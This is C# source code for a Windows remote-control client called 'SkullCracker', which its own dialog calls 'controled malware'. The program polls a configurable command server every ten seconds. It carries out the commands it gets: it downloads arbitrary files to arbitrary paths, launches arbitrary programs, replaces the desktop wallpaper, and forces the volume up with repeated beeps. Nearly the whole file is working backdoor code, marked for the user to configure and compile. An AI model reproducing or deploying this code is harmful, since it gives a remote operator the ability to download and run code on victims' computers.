using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SkullCracker {
    internal static class Program {
        #region sys variables
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 1;
        public const int SPIF_SENDCHANGE = 2;

        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
        #endregion

        static WebClient client = new WebClient();

        private static string UID = "someid";

        //CHANGE THIS VALUES BEFORE COMPILING
        private static string author = "anonymous";
        private static string[] APIs = new string[] {
            "http://host:port/endpoint",
        };

        static void aLisener() {
            int apiIndex = 0;

            while (true) {
                try {
                    string[] cms = client.DownloadString(APIs[apiIndex]).Split(';');
                    foreach (string cmz in cms) {
                        string[] cm = cmz.Split(' ');
                        doAction(cm);
                    }
                }
                catch {
                    if (apiIndex < APIs.Length) {
                        apiIndex++;
                    } else
                    {
                        apiIndex = 0;
                    }
                }

                var t = Task.Run(async delegate {
                    await Task.Delay(10000);
                    return 42;
                });
                t.Wait();
            }
        }

        static void doAction(string[] _params) {
            try {
                if (_params[0] == UID) {
                    if (_params[1] == "setBackground") {
                        string imgPath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\" + "generateUID()" + ".tmp";
                        client.DownloadFile(_params[2], imgPath);
                        setBackground(imgPath);
                        System.IO.File.Delete(imgPath);
                    }
                    else if (_params[1] == "startProgram") {
                        System.Diagnostics.Process.Start(_params[2]);
                    }
                    else if (_params[1] == "loudAudioBeep") {
                        for (int i = 0; i < 44; i++) {
                            keybd_event((byte)System.Windows.Forms.Keys.VolumeUp, 0, 0, 0);
                            Console.Beep();
                        }
                    }
                    else if (_params[1] == "downloadFile") {
                        client.DownloadFile(_params[2], _params[3]);
                    }
                    else if (_params[1] == "close") {
                        Environment.Exit(0);
                    }
                }
            }
            catch (Exception e) {
                logError(e);
            }
        }

        /*void getPid()
        {
            try
            {
                if (UID == null)
                {
                    var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
                    ManagementObjectCollection mbsList = mbs.Get();

                    UID = mbsList
                    .OfType<ManagementObject>()
                    .First()["ProcessorId"]
                    .ToString();
                }
            }
            catch (Exception exec)
            {
                logError(exec);
            }
        }*/

        private static void logError(Exception exec) {
            System.IO.File.WriteAllText(Environment.CurrentDirectory + "/errors.log", exec.Message + exec.StackTrace);
        }

        public static void setBackground(string imagePath) {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, imagePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        [STAThread]
        static void Main() {
            if (!File.Exists("eula.txt")) {
                DialogResult dialogResult = System.Windows.Forms.MessageBox.Show(
                    "Do you authorize \"" + author + "\"\nto use your SkullCracker client, wich is a controled malware onto your device?",
                    "Usage authoritzation",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning
                );
                if (dialogResult == System.Windows.Forms.DialogResult.Yes) {
                    File.WriteAllText("eula.txt", "eula text");
                }
            }

            if (File.Exists("eula.txt")) {
                aLisener();
            }
        }
    }
}
